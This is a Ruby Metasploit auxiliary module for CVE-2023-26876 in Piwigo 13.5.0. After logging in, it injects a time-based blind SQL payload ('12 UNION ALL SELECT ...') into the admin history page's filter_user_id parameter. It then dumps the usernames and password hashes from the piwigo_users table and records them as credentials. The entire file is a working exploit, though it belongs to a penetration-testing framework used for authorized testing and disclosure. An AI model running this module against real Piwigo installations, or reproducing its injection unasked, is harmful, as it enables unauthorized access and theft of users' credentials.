##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::SQLi
    def initialize(info = {})
      super(update_info(info,
        'Name'           => 'Piwigo Gather Credentials via SQL Injection',
        'Description'    => %q{
           This module enables an authenticated user to collect the usernames and
           encrypted passwords of other users in the Piwigo 13.5.0 via SQL
           injection - CVE-2023-26876 .
        },
        'Author'         => [
                              'Rodolfo "incogbyte" Tavares'
                            ],
        'License'        => MSF_LICENSE,
        'References'     => [
                              [ 'CVE', '2023-26876' ] # CVE-2023-26876 https://nvd.nist.gov/vuln/detail/CVE-2023-26876
                            ],
        'DisclosureDate' => '04/21/2023'
      ))
  
      register_options(
        [
          OptString.new('TARGETURI', [ true, 'The base path to Piwigo', '/' ]),
          OptString.new('USERNAME', [ true, 'The username for authenticating to Piwigo', 'piwigo' ]),
          OptString.new('PASSWORD', [ true, 'The password for authenticating to Piwigo', 'piwigo' ])
        ])
    end
  
    def check
      login_page = target_uri.path.end_with?('index.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/index.php')
  
      res = send_request_cgi(
        'method'  =>  'GET',
        'keep_cookies' => true,
        'uri'     =>  normalize_uri(login_page)
      )
  
      if res && res.code == 200
        return res
      else
        print_error('[!] could not find any piwigo instance')
      end
  
      return res
    end
  
    def login(response)
      return false unless response
  
      login_uri = target_uri.path.end_with?('identification.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/identification.php')
      print_status("[*] Logging in...")
  
      login_res = send_request_cgi(
         'method'  =>  'POST',
         'uri'     =>  login_uri,
         'keep_cookies' => true,
         'vars_post' =>  {
           'username'  =>  datastore['USERNAME'],
           'password'  =>  datastore['PASSWORD'],
           'login' =>  'Login'
         }
       )
  
       if login_res.code != 302 || login_res.body.include?('Invalid username or password!')
        fail_with(Failure::NoAccess, "Couldn't log into Piwigo")
       end
  
       print_good("[*] Successfully logged into Piwigo!!")
       return login_res
    end
  
    def check_access(response_from_login)
      response_from_login = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'admin.php'),
        'vars_get' => {
          'page' => 'history',
          'filter_image_id' => '1',
          'filter_user_id' => '1'
        }
      })
  
      if response_from_login.code == 200 && response_from_login
          print_status "Admin, Access granted !"
          get_info(response_from_login)
      end
  
    end
  
    def get_info(response_from_login)
      print_status "starting SQLi testing"
      canary_string = ""
     
      @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
        response_from_login = send_request_cgi({
          'method' => 'GET',
          'uri' => normalize_uri(target_uri.path, 'admin.php'),
          'vars_get' => {
            'page' => 'history',
            'filter_image_id' => '1',
            'filter_user_id' => "12 UNION ALL SELECT #{payload}"
          }
        })
      end ## nested do
      
      unless @sqli.test_vulnerable
        fail_with Failure::PayloadFailed, "#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay."
      end

      columns = ['usernames', 'passwords']
      results = @sqli.dump_table_fields('piwigo_users', columns)
      table = Rex::Text::Table.new('Header' => 'piwigo_users', 'Indent' => 1, 'Columns' => columns)
      results.each do |user|
        create_credential({
          workspace_id: myworkspace_id,
          origin_type: :service,
          module_fullname: fullname,
          username: user[0],
          private_type: :nonreplayable_hash,
          jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
          private_data: user[1],
          service_name: 'Piwigo',
          address: ip,
          port: datastore['RPORT'],
          protocol: 'tcp',
          status: Metasploit::Model::Login::Status::UNTRIED
        })
        table << user
      end
      print_good(table.to_s)
    end
  
    def run
      available_res = check
      fail_with(Failure::NotFound, "Could not access the Piwigo webpage") unless available_res
      response_from_login = login(available_res)
      fail_with(Failure::NoAccess, "Could not log in. Verify credentials") unless response_from_login.code == 302
      check_access(response_from_login)
    end
  end
  
